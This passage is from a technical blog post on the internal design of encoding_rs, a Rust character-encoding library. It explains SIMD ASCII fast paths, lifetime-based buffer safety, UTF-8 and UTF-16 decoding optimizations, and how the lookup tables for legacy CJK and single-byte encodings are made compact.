<code>fn <a class="fnname" href="http://hsivonen.iki.fi/feed/mozilla/#method.decode_with_bom_removal">decode_with_bom_removal</a>&lt;'a&gt;(<br />¬†¬†¬†¬†&amp;'static self, <br />¬†¬†¬†¬†bytes: <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">&amp;'a [</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.u8.html">u8</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.slice.html">]</a><br />) -&gt; <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.tuple.html">(</a><a class="enum" href="https://doc.rust-lang.org/nightly/alloc/borrow/enum.Cow.html" title="enum alloc::borrow::Cow">Cow</a>&lt;'a, <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.str.html">str</a>&gt;, <a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.bool.html">bool</a><a class="primitive" href="https://doc.rust-lang.org/nightly/std/primitive.tuple.html">)</a></code>

</p><p>(<code>Cow</code> is a Rust standard library type that wraps either an owned type or a corresponding borrowed type, so a heap allocation and copy can be avoided if the caller only needs a borrow. E.g., <code>Cow&lt;'a, str&gt;</code> wraps either a heap-allocated string or a pointer and a length designating a string view into memory owned by someone else. Lifetime <code>'a</code> indicates that the lifetime of borrowed output depends on the lifetime of the input.) 

</p><h3>Internals</h3>

<p>Internally, there are five guiding design principles.

</p><ol>
	<li>For the legacy CJK encodings the conversions to and from UTF-8 and UTF-16 should come from the same source code instead of being implemented twice. (For the UTFs and for single-byte encodings, there are enough optimization opportunities from having two implementations that it doesn‚Äôt make sense to keep those unified for the sake of unification.)
	</li><li>Since Web content is either markup, which is runs of ASCII mixed with runs of potentially non-ASCII, and CSS and JS, which are almost entirely ASCII, handling of the ASCII range should be very fast and use SIMD where possible.
	</li><li>Small binary size matters more than the speed of encode into legacy encodings.
	</li><li>For performance, everything should be inlined into the conversion loop. (This rules out abstractions that would involve virtual calls from within the conversion loop.)
	</li><li>The instantiation of converters should be very efficient‚Äîjust a matter of initializing a few machine words. The instantiation should not read from the file system (other than the system lazily paging in the binary for encoding_rs itself), run decompression algorithms, allocate memory on the heap or compute derived lookup tables from other lookup tables.
</li></ol>

<h4>Abstracting over UTF-8 and UTF-16</h4>

<p>Even though in principle compile-time abstraction over UTF-8 and UTF-16 is a matter of monomorphizing over <code>u8</code> and <code>u16</code>, handling the two cases using generics would be more complicated than handling them using macros. That‚Äôs why it‚Äôs handled using macros. The conversion algorithms are written as blocks of code that are inputs to macros that expand to provide the skeleton conversion loop and fill in the encoding-specific blocks of code. In the skeleton in the decode case, one instantiation uses a <code>Utf8Destination</code> struct and another uses a <code>Utf16Destination</code> struct both of which provide the same API for writing into them. In the encode case, the source struct varies similarly.

</p><h4>Using Rust Lifetimes to Match Buffer Accesses to Space Checks</h4>

<p>The old code in uconv was relatively ad hoc in how it accessed the input and output buffers. It maybe did stuff, advanced some pointers, checked if the pointers reached the end of the buffer and maybe even backed off a bit in some places. It didn‚Äôt have an overarching pattern to how space availability was checked and matched to memory accesses so that no accesses could happen without a space check having happened first. For encoding_rs, I wanted to make sure that buffer access only goes forwards without backtracking more than the one byte that might get unread in error cases and that no read happens without checking that there is still data to be read and no write happens without checking that there is space in the output buffer.

</p><p>Rust‚Äôs lifetimes can be used to enforce an ‚Äúat most once‚Äù property. Immediately upon entering a conversion function, the input and output slices are wrapped in source and destination structs that maintain the current read or write position. I‚Äôll use the write case as the example, but the read case works analogously. A decoder that only ever produces characters in the basic multilingual plane uses a BMP space checking method on the destination that takes the destination as a mutable reference (<code>&amp;mut self</code>). If the destination is a UTF-8 destination, the method checks that there is space for at least three additional bytes. If the destination is a UTF-16 destination, the method checks that there is space for at least one additional code unit. If there is enough space, the caller receives a BMP handle whose lifetime is tied to the the lifetime of the destination due to the handle containing the mutable reference to the destination. A mutable reference in Rust means exclusive access. Since a mutable reference to the destination is hidden inside the handle, no other method can be called on the destination until the handle goes out of scope. The handle provides a method for writing one BMP scalar value. That method takes the handle‚Äôs <code>self</code> by value consuming the handle and preventing reuse.

</p><p>The general concept is that at the top of the loop, the conversion loop checks availability of data at the source and obtains a read handle or returns from the conversion function with <code>InputEmpty</code> and then checks availability of space at the destination and obtains a write handle or returns from the conversion function with <code>OutputFull</code>. If neither check caused a return out of the conversion function, the conversion loop now hasn‚Äôt read or written either buffer but can be fully confident that it can successfully read from the input at most once and write a predetermined amount of units to the output at most once during the loop body. The handles go out of scope at the end of the loop body, and once the loop starts again, it‚Äôs time to check for input availability and out space availability again.

</p><p>As an added twist, the read operation yields not only a byte of input but also an unread handle for unreading it, because in various error cases the spec calls for prepending input that was already read back to the input stream. In practice, all the cases in the spec can be handled by being able to unread at most one unit of input even though the spec text occasionally prepends more than one unit.

</p><h4>Optimizing ASCII and Multibyte Sequences</h4>

<p>In practice, the ISO-2022-JP converters, which don‚Äôt need to be fast for Web use cases, use the above concept in its general form. For the ASCII-compatible encodings that are actually performance-relevant for Web use cases, there are a couple of elaborations.

</p><p>First, the UTF-8 destination and the UTF-16 destination know how to copy ASCII from a byte source in an efficient way that handles more than one ASCII character per register (either a SIMD register or even an ALU register). So the main conversion loop starts with a call to a method that first tries to copy ASCII from the source to the destination and then returns a non-ASCII byte and write handle if there‚Äôs space left the destination. Once a non-ASCII byte is found, another loop is entered into that actually works with the handles.

</p><p>Second, the loop that works with the handles doesn‚Äôt have a single scope per loop body for multi-byte encodings. Once we‚Äôre done copying ASCII, the non-ASCII byte that we found is always a lead byte of a multi-byte sequence unless there is an error‚Äîand we are optimizing for the case where there is neither an error nor a buffer boundary. Therefore, it makes sense to start another scope that does the handle obtaining space check choreography <i>again</i> in the hope that the next byte will be a valid trail byte given the lead byte that we just saw. Then there is a third innermost loop for reading the next byte after that so that if non-ASCII we can continue the middle loop as if this non-ASCII byte had come from the end of the initial ASCII fast path and if the byte is ASCII punctuation, we can spin in the innermost loop without trying to handle a longer ASCII run using SIMD, which would likely fail within CJK plain text. However, if we see non-punctuation ASCII, we can continue the outermost loop and go back to the ASCII fast path.

</p><p>Not matching on a state variable indicating whether we‚Äôre expecting a lead or trail byte on a per-byte basis and instead using the program counter for the state distinguishing between lead and trail byte expectations is good for performance. However, it poses a new problem: What if the input buffer ends in the middle of a multi-byte sequence? Since we are using the program counter for state, the code for handling the trail byte in a two-byte encoding is only reachable by first executing the code for handling the lead byte, and since Rust doesn‚Äôt have <code>goto</code> or a way to store <a href="https://en.wikipedia.org/wiki/Call-with-current-continuation">continuations</a>, after a buffer boundary we can‚Äôt just restore the local variables and jump directly to the trail byte handling. To deal with this, the macro structure that allows the reuse of code for decoding both to UTF-8 and to UTF-16 also duplicates the block for handling the trail byte such that the same block occurs between the function method entry and the conversion loop. If the previous buffer ended in the middle of a byte sequence, the next call to the conversion function handles the trail of that sequence before entering the actual conversion loop.

</p><h4>Optimizing UTF-8</h4>

<p>The UTF-8 decoder does not use the same structure as the other multi-byte decoders. Dealing with invalid byte sequences in the middle of the buffer or valid byte sequences that cross a buffer boundary is implemented na√Øvely from the spec in a way that is instantiated via macro from the same code both when converting to UTF-8 and when converting to UTF-16. However, once that outer tier of conversion gets to a state where it expects the next UTF-8 byte sequence, it calls into fast-track code that only deals with valid UTF-8 and returns back to the outer tier that‚Äôs capable of dealing with invalid UTF-8 or partial sequences when it discovers an incomplete sequence at the end of the buffer or an invalid sequence in the middle. This inner fast track is implemented separately for decoding UTF-8 to UTF-8 and for decoding UTF-8 to UTF-16. 

</p><p>The UTF-8 to UTF-16 case is close enough to one might expect from the above description of legacy multibyte encodings. At the top of the loop, there is the call to the ASCII fast path that zero-extends ASCII to UTF-16 Basic Latin multiple code units at a time and then byte sequences that start with a non-ASCII lead byte are handles as three cases: two-byte sequence, three-byte sequence or four-byte sequence. Lookup tables are used to check the validity of the combination of lead byte and second byte as explained below. The sequence is considered consumed only if it‚Äôs found to be valid. The corresponding UTF-8 code units are then written to the destination as normal <code>u16</code> writes.

</p><p>The UTF-8 to UTF-8 case is different. The input is read twice, but the writing is maximally efficient. First, a UTF-8 validation function is run on the input. This function only reads and doesn‚Äôt write and uses an ASCII validation fast path that checks more than one code unit at a time using SIMD or multiple code units per ALU word. The UTF-8 validation function is the UTF-8 to UTF-16 conversion function with all the writes removed. After the validation, the valid UTF-8 run is copied to the destination using <code>std::ptr::copy_nonoverlapping()</code>, which is the Rust interface to LLVM <code>memcpy()</code>. This way, the writing, which is generally less efficient than reading, can be done maximally efficiently instead of being done on a byte-by-byte basis for non-ASCII as would result from a read-once implementation. (Note that in the non-streaming case when the input is valid, both the second read and the writing are avoided. More on that later.)

</p><p>It is not totally clear if this kind of double-reading is smart, since it is a pessimization for the 100% ASCII case. Intuitively, it should help the non-ASCII case, since even the non-ASCII parts can be written using SIMD. However, 100% ASCII UTF-8 to UTF-8 streaming case, which copies instead of borrowing, runs on Haswell at about two thirds of <code>memcpy()</code> speed while the 100% ASCII windows-1252 to UTF-8 case (which writes the SIMD vectors right away without re-reading) runs at about <code>memcpy()</code> speed.

</p><p>The hard parts of looping over potentially-invalid UTF-8 are:

</p><ul>
	<li>Minimizing the performance impact of deciding if the lead byte is valid
	</li><li>Minimizing the performance impact of deciding if the second byte is valid considering that its valid range depends on the lead byte
	</li><li>Avoiding misprediction of the length of the byte sequence representing the next scalar value.
</li></ul>

<p>encoding_rs combines the solution for the first two problems. Once it‚Äôs known that the lead byte is not ASCII, the lead byte is used as an index to a lookup table that yields a byte whose lower two bits are always zero and that has exactly one of the other six bits set to represent the following cases:

</p><ul>
	<li>Byte is not a legal lead byte.
	</li><li>Lead byte is associated with a normal-range second byte.
	</li><li>Lead byte for a three-byte sequence requires special lower bound for second byte.
	</li><li>Lead byte for a three-byte sequence requires special upper bound for second byte.
	</li><li>Lead byte for a four-byte sequence requires special lower bound for second byte.
	</li><li>Lead byte for a four-byte sequence requires special upper bound for second byte.
</li></ul>

<p>The second byte is used as an index to a lookup table yielding a byte whose low two bits are always zere, whose bit in the position corresponding to the lead being illegal is always one and whose other five bits are zero if the second byte is legal given the type of lead the bit position represents and one otherwise. When the bytes from the two lookup tables are ANDed together, the result is zero if the combination of lead byte and second byte is legal and non-zero otherwise.

</p><p>When a trail byte is always known to have the normal range, as the third byte in a three-byte sequence is, we can check that the most significant bit is 1 and the second-most significant bit is zero. Note how the ANDing described in the above paragraph always leaves the two least-significant bits of the AND result as zeros. We shift the third byte of a three-byte sequence right by six and OR it with the AND result from the previous paragraph. Now the validity of the three-byte sequence can be decided in a single branch: If the result is 0x2, the sequence is valid. Otherwise, it‚Äôs invalid.

</p><p>In the case of four-byte sequences, the number computed per above is extended to 16 bits and the two most-significant bits of the fourth byte are masked and shifted to bit positions 8 and 9. Now the validitiy of the four-byte sequence can be decidded in a single branch: If the result is 0x202, the sequence is valid. Otherwise, it‚Äôs invalid.

</p><p>The fast path checks that there is at least 4 bytes of input on each iteration, so the bytes of any valid byte sequence for a single scalar value can be read without further bound checks. The code does use branches to decide whether to try to match the bytes as a two-byte, three-byte or four-byte sequence. I tried to handle the distinction between two-byte sequences and three-byte sequences branchlessly when converting UTF-8 to UTF-16. In this case, the mask applied to the lead byte is taken from a lookup table and mask is taken from a lookup table to zero out the bits of the third byte and the third shift amount (from 6 to 0) in the two-byte case. The result was slower than just having a branch to distinguish between two-byte sequences and three-byte sequences.

</p><p>Now that there is branching to categorize the sequence length, it becomes of interest to avoid that branching. It‚Äôs also of interest to avoid going back to the SIMD ASCII fast path when the next lead is not ASCII. After a non-ASCII byte sequence, instead of looping back to the ASCII fast path, the next byte is read and checked. After a two-byte sequence, the next lead is checked for ASCIIness. If it‚Äôs not ASCII, the code loops back to the point where the SIMD ASCII path has just exited. I.e. there‚Äôs a non-ASCII byte as when exiting the ASCII SIMD fast path, but its non-ASCIIness was decided without SIMD. If the byte is an ASCII byte, it is processed and then the code loops back to the ASCII SIMD fast path.

</p><p>Obviously, this is far from ideal. Avoiding immediate return to ASCII fast path after a two-byte character works within a non-Latin-script word but it doesn‚Äôt really help to let one ASCII character signal a return to SIMD when the one ASCII character is a single space between two non-Latin words. Unfortunately, trying to be smarter about avoiding too early looping back to the SIMD fast path would mean more branching, which itself has a cost.

</p><p>In the two-byte case, if the next lead is non-ASCII, looping back to immediately after the exit from the ASCII fast path means that the next branch is anyway the branch to check if the lead is for a two-byte sequence, so this works out OK for words in non-Latin scripts in the two-byte-per-character part of the Basic Multilingual Plane. In the three-byte case, however, looping back to the point where the ASCII SIMD fast path ends would first run the check for a two-byte lead even though after a three-byte sequence the next lead is more likely to be for another three-byte sequnces. Therefore, after a three-byte sequence, the first check performed on the next lead is to see if it, too, is for a three-byte sequence in which case the code loops back to the start of the three-byte sequence processing code.

</p><h4>Optimizing UTF-16LE and UTF-16BE</h4>

<p>UTF-16LE and UTF-16BE are rare enough on the Web that a browser can well get away with a totally na√Øve and slow from-the-spec implementation. Indeed, that‚Äôs what landed in Firefox 56. However, when talking about encoding_rs, it was annoying to always have the figurative asterisk next to UTF-16LE and UTF-16BE to disclose slowness when the rest was fast. To get rid of the figurative asterisk, UTF-16LE and UTF-16BE decode is now optimized, too.

</p><p>If you read The Unicode Standard, you might be left with the impression that the difference between UTF-16 as an in-memory Unicode representation and UTF-16 as an interchange format is byte order. This is not the full story. There are three additional concerns. First, there is a concern of memory alignment. In the case of UTF-16 as an in-memory Unicode representation, a buffer of UTF-16 code units is aligned to start at a memory address that is a multiple of the size of the code unit. That is, such a buffer always starts at an even address. When UTF-16 as an interchange format is read using a byte-oriented I/O interface, it may happen that a buffer starts at an odd address. Even on CPU architectures that don‚Äôt distinguish between aligned and unaligned 16-bit reads and writes on the ISA layer, merely reinterpreting a pointer to bytes starting at an odd address as a pointer pointing to 16-bit units and then accessing it as if was a normal buffer of 16-bit units is <a href="https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html">Undefined Behavior</a> in C, C++, and Rust (as can in practice be revealed by autovectorization performed on the assumption of correct alignment). Second, there is the concern of buffers being an odd number of bytes in length, so the special logic is needed to handle the split UTF-16 code unit at the buffer boundary. Third, there is the concern of unpaired surrogates, so even when decoding to UTF-16, the input can‚Äôt be just be copied into right alignment, potentially with byte order swapping, without inspecting the data.

</p><p>The structure of the UTF-16LE and UTF-16BE  decoders is modeled on the structure of the UTF-8 decoders: There‚Äôs a na√Øve from-the-spec outer tier that deals with invalid and partial sequences and an inner fast path  that only deals with valid sequences.

</p><p>At the core of the fast path is a struct called <code>UnalignedU16Slice</code> that wraps <code>*const u8</code>, i.e. a pointer that can point to either an ever or an odd address, and a length in 16-bit units. It provides a way to make the unaligned slice one code unit shorter (to exclude a trailing high surrogate when needed), a way to take a tail subslice and ways to read a <code>u16</code> or, if SIMD is enabled, <code>u16x8</code> in a way that assumes the slice might not be aligned. It also provides a way to copy, potentially with endianness swapping, Basic Multilingual Plane code units to a plain aligned <code>&amp;mut [u16]</code> until the end of the buffer or surrogate code unit is reached. If SIMD is enabled, both the endianness swapping and the surrogate check are SIMD-accelerated.

</p><p>When decoding to UTF-16, there‚Äôs a loop that first tries to use the above-mentioned Basic Multilingual Plane fast path and once a surrogate is found, handles the surrogates on a per-code-unit and returns back to the top of the loop if there was a valid pair.

</p><p>When decoding to UTF-8, code copied and pasted from the UTF-16 to UTF-8 <i>encoder</i> is used. The difference is that instead of using <code>&amp;[u16]</code> as the source, the source is an <code>UnalignedU16Slice</code> and, additionally, reads are followed with potential endian swapping. Additionally, unpaired surrogates are reported as errors in decode while UTF-16 to UTF-8 encode silently replaces unpaired surrogates with the REPLACEMENT CHARACTER. If SIMD is enabled, SIMD is used for the ASCII fast path. Both when decoding to UTF-8 and when decoding to UTF-16, endianness swapping is represented by a trait parameter, so the conversions are monomorphized into two copies: One that swaps endianness and one that doesn‚Äôt. This results in four conversion functions: Opposite-endian UTF-16 to UTF-8, same-endian UTF-16 to UTF-8, opposite-endian UTF-16 to UTF-16, same-endian UTF-16 to UTF-16. All these assume the worst for alignment. That is, code isn‚Äôt monomorphized for the aligned and unaligned cases. Unaligned access is fast on aarch64 and on the several most recent x86_64 microarchitectures, so optimizing performance of UTF-16LE and UTF-16BE in the aligned case for Core2 Duo-era x86_64 or for ARMv7 at the expense of binary size and source code complexity would be a bit too much considering that UTF-16LE and UTF-16BE performance doesn‚Äôt even really matter for Web use cases.

</p><h4>Optimizing x-user-defined</h4>

<p>Unlike the other decoders, the x-user-defined decoder doesn‚Äôt have an optimized ASCII fast path. This is because the main remaining use case for x-user-defined it is loading binary data via <code>XMLHttpRequest</code> in code written before  proper binary data support via <code>ArrayBuffer</code>s was  introduced to JavaScript. (Note that when HTML is declared as x-user-defined via the <code>meta</code> tag, the <a href="https://html.spec.whatwg.org/#prescan-a-byte-stream-to-determine-its-encoding">windows-1252 decoder is used in place of the x-user-defined decoder</a>.)

</p><p>When decoding to UTF-8, the byte length of the output varies depending on content, so the operation is not suitable for SIMD. The loop simply works in a per-byte basis. However, when decoding to UTF-16 with SIMD enabled, each <code>u8x16</code> vector is zero-extended into two <code>u16x8</code> vectors. A mask computed by a lane-wise greater-than comparison to see which lanes were not in the ASCII range. The mask is used to retain the corresponding lanes from a vector of all lanes set to 0xF700 and the result is added to the original <code>u16x8</code> vector.

</p><h4>Portable SIMD</h4>

<p>(Nightly) Rust provides access to portable SIMD which closely maps to LLVM‚Äôs notion of portable SIMD. There are portable types, such as the <code>u8x16</code> and <code>u16x8</code> types used by encoding_rs. These map to SSE registers on x86 &amp; x86_64 and NEON registers on ARMv7 &amp; aarch64, for example. The portable types provide lane-wise basic arithmetic, bitwise operations, and comparisons in a portable manner and with generally predictable performance characteristics. Additionally, there are portable shuffles where  the shuffle pattern is constant at compile time. The performance characteristics of shuffles rely heavily on the quality of implementation of specific LLVM back ends, so with shuffles it‚Äôs a good idea to inspect the generated assembly.

</p><p>The portable types can be zero-cost transmuted into vendor-specific types in order to perform operations using vendor-specific intrinsics. This means that SIMD code can generally be written in a portable way and specific operations can be made even faster using vendor specific operations. For example,  checking if a <code>u8x16</code> contains only ASCII can be done very efficiently on SSE2 and aarch64, so the SIMD ‚Äúis this <code>u8x16</code> ASCII?‚Äù operation in encoding_rs has vendor-specific specializations for SSE2 and aarch64. This is an amazing improvement over C. With C, an entire langer function / algorithm that uses SIMD ends up being written separately for each instruction set using vendor intrinsics for everything‚Äîeven the basic operations that are supported by practically all vendors. It often happens that such vendor-specific code is written only for x86/x86_64 with ARMv7 or aarch64 left as a todo with POWER, etc., completely ignored.

</p><p>Despite Rust making SIMD portable, performance tuning for specific architectures using conditional compilation to turn alternative implementations on or off is still needed. For example, because NEON on ARMv7 lacks an efficient ‚Äúis this <code>u8x16</code> ASCII?‚Äù check, using NEON for processing the ASCII runs in UTF-8 validation turned out not to be an improvement over ALU-only code on ARMv7, even though using SIMD in UTF-8 validation makes sense on x86 and x86_64. On the other hand, the difference between using aligned or unaligned SIMD loads and stores is negligible on aarch64 (tested on ThunderX), so on that architecture encoding_rs uses unaligned loads and stores unconditionally. However, especially on Core2 Duo-era x86_64, the difference between using aligned access compared to using unaligned loads and stores with addresses that are actually aligned is very significant, so in the SSE2 case encoding_rs checks for alignment first and has four-way specializations for the four combinations of the source and destination being aligned or unaligned. As of June 2018, 20% of the Firefox x86/x86_64 release population was still on the kind of x86/x86_64 CPU where there‚Äôs a substantial performance disparity between aligned and unaligned SIMD loads and stores with actually aligned addresses.

</p><h4>Punctuation Loops</h4>

<p>Using SIMD for ASCII poses the problem that many non-Latin scripts use ASCII spaces and punctuation. If we return directly to the SIMD path upon seeing a single ASCII byte after a sequence of non-ASCII, we may end up processing a SIMD vector only to find that it‚Äôs not fully ASCII, because it just starts with an ASCII space or an ASCII punctuation character followed by an ASCII space and then non-ASCII follows again.

</p><p>For non-Latin scripts that use ASCII spaces and punctuation, after non-ASCII it is useful to have a loop that keeps processing ASCII bytes using the ALU as long as the byte values are below the less-than sign. This way, ASCII spaces, punctuation and digits do not result unhelpful use of SIMD, but HTML markup results in a jump back to the SIMD path.

</p><p>In the case of the legacy CJK encodings, it‚Äôs easy to decide whether to have such a punctuation loop are not: Korean benefits from one, so EUC-KR gets such a loop. Chinese and Japanese don‚Äôt benefit from such a loop, so the rest of the legacy CJK encodings don‚Äôt get one.

</p><p>The decision is trickier for single-byte encodings and UTF-8. In the interest of code size, all the single byte encodings (other than x-user-defined) are handled with the same code. For the Latin encodings, it would be beneficial not to have a punctuation loop. For Cyrillic, Greek, Arabic and Hebrew, it is beneficial to have the punctuation loop. Decoding the Latin single-byte encodings is faster anyway, so the punctuation loop is therefore all single-byte encodings for the benefit of the ones that are non-Latin but use ASCII spaces and punctuation.

</p><p>UTF-8 calls for a one-size-fits-all solution. By the same logic, one should expect to put a punctuation loop in the UTF-8 to UTF-16 decoder. Yet, there is no punctuation loop in the UTF-8 to UTF-16 decoder. I don‚Äôt recall the details, but a punctuation loop didn‚Äôt behave well. I didn‚Äôt investigate why exactly a punctuation loop didn‚Äôt behave well in this case, but the conversion loop is pretty delicate even without a punctuation loop, so maybe there was some bad interaction in the optimizer. Rust has been through LLVM major version updates since I experimented with this code, so it might be worthwhile to experiment again.

</p><h4>Fast Instantiation of Converters</h4>

<p>Character encoding conversion libraries typically reserve the right to perform expensive operations when a decoder or an encoder is instantiated. Expensive operations could include loading lookup tables from the file system, decompressing lookup tables or deriving encode-oriented lookup tables from decode-oriented lookup tables. This is problematic.

</p><p>When the instantiation of a converter is potentially expensive, libraries end up recommending that callers hold onto converters and reset them between uses. Since encoding_rs builds BOM handling into the decoders, does so by varying the initial state of a state machine and BOM sniffing can change what encoding the decoder is for, being able to reset a decoder would require storing a second copy of the initial state in the decoder. More importantly, though, the usage patterns for character encoding converters tend to be such (at least in a Web browser) that there isn‚Äôt a natural way for callers to hold onto converters and creating some kind of cache for recycled converters create threading-problems and shouldn‚Äôt be the callers‚Äô responsibility anyway. Even a thread-safe once-per-process heap-allocation on first use would be a problem. Firefox is both a multi-threaded and a multi-process application. E.g. generating a heap-allocated encode-optimized lookup table in a thread-safe way on first use would end up costing the footprint of the table in each process even if sharing between threads appeared simple enough.

</p><p>To avoid these problems, encoding_rs guarantees that instantiating a converter is a very cheap operation: just a matter of loading some constants into a few machine words. No up-front computation on the data tables is performed during the converter instantiation. The data tables are Plain Old Data arranged in the layout that the conversion algorithms access. Of course, if the relevant part of the program binary hasn‚Äôt been paged in yet, accessing the data tables can result in the operating system paging them in.

</p><h4>Single-Byte Lookup Table Layout</h4>

<p>The Encoding Standard gives the mapping tables for the legacy encodings as arrays indexed by what the spec calls the ‚Äúpointer‚Äù. For single-byte encodings, the pointer is simply the unsigned byte value minus 0x80. That is, the lower half passes through as ASCII and the higher half is used for simple table lookup when decoding.

</p><p>Conceptually, the encoder side is a linear search through the mapping table. A linear search may seem inefficient and, of course, it is. Still, the encode operation with the legacy encodings is actually rather rare in the Web Platform. It is exposed in only two places: in the error handling for the query string URLs occurring as attribute values in HTML and in HTML form submission. The former is error handling  for the case where the query string hasn‚Äôt been properly percent escaped and, therefore, relatively rarely has to handle non-ASCII code points. The latter happens mainly in response to a user action that is followed by a network delay. An encoding library can get away with slowness in this case, since the slowness can get blamed on the network anyway. Furthermore, encoder speed that is shockingly slow percentage-wise compared to how fast it could be can still be fast in terms of human-perceivable timescales for the kind of input sizes that typically occur in the text fields of an HTML form.

</p><p>The design of encoding_rs took place in the context of the CLDR parts of ICU having been accepted as part of desktop Firefox but having been blocked from inclusion in Firefox for Android for an extended period of time out of concern of the impact on apk size. I wanted to make sure that encoding_rs could replace uconv without getting blocked on size concerns on Android. Therefore, since there wasn‚Äôt a pressing need for the encoders for legacy encodings to be fast and there was a binary size concern (and the performance concern of instantiating an encoder excluding the option of spending time computing and encode-specific lookup table from decode-specific tables at the time of encoder instantiation), I made it a design principle that encoding_rs would have no encoder-specific data tables and instead the encoders would search the decode-oriented data tables even if it meant linear search.

</p><p>As shipped in Firefox 56, the single-byte encoders in encoding_rs performed forward linear search across each quadrant of the lookup table for the single-byte encoding such that the fourth quadrant was search first and the first quadrant was searched last. This search order make the most sense for the single byte encodings considered collectively, since most encodings have lower-case letters in the fourth quadrant and the first quadrant is either effectively unused or contains rare punctuation.

</p><p>In encoding_rs 0.8.11 (Firefox 65), though, as a companion change to compile-time options to speed up legacy CJK encode (discussed below), I relaxed the principle of not having any encode-specific data a little based on the observation that adding just 32 <i>bits</i> (not <i>bytes</i>!) of encoder-specific data per single-byte encoding could significantly accelerate the encoders for Latin1-like and non-Latin single-byte encodings while not making the performance of non-Latin1-like Latin encodings notably worse. Adding 8 bits for an offset in the lookup table to the start of a run on the consecutive code points, 8 bits for the length of the run and 16 bits for an offset to the start of the run in the Unicode code points, the common case (the code points to encode falling within the range) could be handled without a linear search. Unlike in the case of CJK legacy encode compile time options, the addition of 32 bits per single-byte encoding was small enough in added footprint that I thought it did not make sense to make it a compile-time option. Instead, the 32 bits per single-byte encoding are there unconditionally.

</p><h4>Multi-Byte Lookup Table Layout</h4>

<p>For multi-byte legacy encodings, the pointer is computed from two or more bytes. In that case, the computation forms a linear offset to the array when not all values of the (typically) two bytes are valid or the valid values for the two bytes aren‚Äôt contiguous. This is in contrast to some previous formulations where two bytes are interpreted as a 16-bit big endian integer and then that integer is considered to map to Unicode. Since not all values of the two bytes are in use, simply interpreting the two bytes as a 16-bit big endian integer would result in a needlessly sparse lookup table. (A sparse lookup table can have the benefit of being able to combine bits from the lead and trail byte without an actual multiplication instruction, which may have been important in the past. E.g. Big5 with a dense lookup table involves multiplying by 157, which compiles to an actual multiplication instruction.)

</p><p>Still with the linearization math provided by the spec, the lookup tables provided by the spec are not fully dense.  Since legacy encodings are not exercised by the modern most performance-sensitive sites and binary size on Android was a concern, I sought to make the lookup tables more compact potentially trading off a bit of performance. <a href="https://encoding.spec.whatwg.org/euc-kr.html">Visualizing the lookup table for EUC-KR</a> <i>(warning: the link points to a page that may be too large for phones with little RAM)</i> reveals that the lookup table has two unused vertical bands as well as an unused lower left quadrant. The Japanese lookup tables (<a href="https://encoding.spec.whatwg.org/jis0208.html">JIS X 0208 with vendor extensions</a> and <a href="https://encoding.spec.whatwg.org/jis0212.html">JIS X 0212</a>) also have unused ranges. The <a href="https://encoding.spec.whatwg.org/gb18030.html">gbk lookup table</a> has no unused parts but in place of unused parts has areas filled with consecutive Private Use Area code points. More generally, the lookup tables have ranges of pointers that map to consecutive Unicode code points. As the most obvious examples, the Hiragana and Katakana characters occur in the lookup tables in the same order as they appear in Unicode, therefore, forming ranges of consecutive code points. 
The handling of such ranges can be performed by excluding them from the lookup table and instead writing a range check (and offset addition) in the decoder program code. (Aside: The visualizations were essential in order to gain understanding of the structure of the legacy CJK encodings. I developed the visualizations when working on encoding_rs and contributed them to the spec.)

</p><p>Furthermore, the way EUC-KR and gbk have been extended from their original designs has a relationship with Unicode. The original smaller lookup table appears in the visualizations of the extended lookup tables on the lower right. In the case of EUC-KR, the original KS X 1001 lookup table contains the Hangul syllables in common use. In the case of gbk, the original GB2312 lookup table contains the most common (simplified) Hanzi ideographs. The extended lookup table for EUC-KR, at the top and on the left, contains <i>in the Unicode order</i> all the Hangul syllabes from the Hangul Syllables Unicode block that weren‚Äôt already included in the original KS X 1001 part on the lower right. Likewise, the extended lookup table for gbk, at the top and on the left, contains <i>in the Unicode order</i> all the ideographs from the CJK Unified Ideographs Unicode block that weren‚Äôt already included in the original GB2312  part on the lower right.

</p><p>That is, after omitting the empty vertical bands in EUC-KR, in both EUC-KR and gbk the top part and the bottom left part  form runs of consecutive code points such that the last code point in each run is less than the first code point in the next run. These are stored as tables (one for top and another for botton left) that contain the (linearized) pointer for the start of each such run and tables of equal length that contain the first code point of each run. When decoding, binary search with the linearized pointer can be performed to locate the start of the run that the pointer belongs to. The code point at the start of the run can be then obtained by reading the corresponding item from the table of the first code points of the runs. The correct code point within the range can be obtained by adding to the first code point the offset obtained by subtracting the pointer to the start of run from the pointer being searched. On the encoder side, linear search with the code point can be performed in the table starting the first code point of each range instead after it has been established that the Hangul Syllable code point (in the EUC-KR case) or the CJK Unified Ideograph code point (in the gbk case) wasn‚Äôt found in the lower right part of the lookup table.  (This process could be even optimized further by arranging the tables in the <a href="https://arxiv.org/abs/1509.05053">Eytzinger order</a> instead.)

</p><p>Adding more program code in order to make the lookup tables smaller worked in most cases. Replacing ranges like Hiragana and Katakana with explicitly-programmed range checks and by compressing the top and bottom left parts of EUC-KR and gbk as described above resulted in an overall binary size reduction except for big5. In the case of big5, the added program code seemed to exceed the savings from a slightly smaller lookup table. That‚Äôs why the above techniques were not applied in released code to Big5 after all.

</p><p>However, Big5 did provide the opportunity to separate the Unicode plane from the lower 16 bits instead of having to store 32-bit scalar values. The other lookup tables (excluding the non-gbk part of gb18030, which is totally different) only contain code points from the Basic Multilingual Plane, so the code points can be stored in 16 bits. The lookup table for Big5, however, contains code points from above the Basic Multilingual Plane. Still, the code points from above the Basic Multilingual Plane are not arbitrary code points. Instead, they are all from the Supplementary Ideographic Plane. Therefore, the main lookup table can contain the low 16 bits and then there is a bitmap that indicates whether the code point is on the Basic Multilingual Plane or on the Supplementary Ideographic Plane.

</p><p>It is worth noting that while the attempts to make the tables smaller strictly add branching when decoding to UTF-16, in some cases when decoding to UTF-8 they merely move a branch to a different place. For example, when the code has a branch to handle e.g. Hiragana by offset mapping, it knows that a Hiragana character will be three bytes in UTF-8, so the branch to decide the UTF-8 sequence length based on scalar value is avoided. (There are separate methods for writing output that is known to be three bytes in UTF-8, output that is known to be two bytes in UTF-8, and output that might be either two or three bytes in UTF-8. In the UTF-16 case, all these methods do the same thing an output a single UTF-16 code unit.)

